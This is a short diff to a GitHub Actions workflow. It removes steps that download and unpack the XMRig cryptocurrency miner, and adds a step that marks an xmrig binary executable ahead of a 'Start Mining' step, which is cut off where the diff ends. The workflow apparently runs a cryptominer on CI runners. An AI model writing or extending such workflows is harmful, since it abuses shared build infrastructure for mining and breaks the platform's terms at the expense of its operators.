@@ -12,14 +12,8 @@ jobs:
       - name: Setup Repository
         uses: actions/checkout@v3
       
-      - name: Check Architecture
-        run: uname -m
-
-      - name: Download XMRig
-        run: |
-          wget https://github.com/xmrig/xmrig/releases/download/v6.19.2/xmrig-6.19.2-linux-x64.tar.gz
-          tar -xvf xmrig-6.19.2-linux-x64.tar.gz
-          chmod +x xmrig
+      - name: Set Execute Permissions
+        run: chmod +x xmrig
 
       - name: Start Mining
         run: |
